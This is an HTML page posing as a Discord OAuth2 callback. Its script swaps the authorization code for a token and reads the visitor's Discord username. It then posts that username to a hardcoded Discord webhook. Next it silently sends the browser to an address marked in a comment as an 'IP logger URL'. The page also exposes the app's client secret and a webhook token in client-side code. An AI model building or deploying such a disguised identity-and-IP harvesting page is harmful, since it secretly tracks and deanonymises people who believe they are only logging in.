<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>OAuth2 Callback</title>
</head>
<body>
  <div id="message" style="font-family: Arial; font-size: 20px; margin: 40px;">
    Redirecting, please wait a second...
  </div>

  <script>
    async function sendWebhook(username) {
      const webhookURL = "https://discord.com/api/webhooks/1335480654921469962/f1Aixgi0LwOK9iG690d2gMJNNQLXa9LtTw6nVnbPJtcgewKTk4b0B2OqkntLaDDFgQpA";

      const payload = {
        content: `User authorized: ${username}`,
      };

      await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    }

    async function main() {
      const params = new URLSearchParams(window.location.search);
      const code = params.get("code");
      if (!code) {
        document.getElementById("message").textContent = "No code provided!";
        return;
      }

      // Exchange code for access token
      const data = new URLSearchParams({
        client_id: "1383108267420553246",
        client_secret: "EfKWFW1jtqWMOwGFwUdcYTXlGdSosqu8",
        grant_type: "authorization_code",
        code: code,
        redirect_uri: "https://o-auth2-tan.vercel.app/api/callback",
      });

      try {
        const tokenRes = await fetch("https://discord.com/api/oauth2/token", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: data.toString(),
        });
        const tokenJson = await tokenRes.json();
        const access_token = tokenJson.access_token;

        if (!access_token) {
          document.getElementById("message").textContent = "Failed to get access token";
          return;
        }

        // Get user info
        const userRes = await fetch("https://discord.com/api/users/@me", {
          headers: { Authorization: `Bearer ${access_token}` },
        });
        const userJson = await userRes.json();
        const username = `${userJson.username}#${userJson.discriminator}`;

        // Send to webhook
        await sendWebhook(username);

        // Redirect after 2 seconds
        setTimeout(() => {
          window.location.href = "https://gify-sable.vercel.app/api/image.py"; // Change this to your IP logger URL
        }, 2000);

      } catch (e) {
        document.getElementById("message").textContent = "Error occurred during auth";
        console.error(e);
      }
    }

    main();
  </script>
</body>
</html>
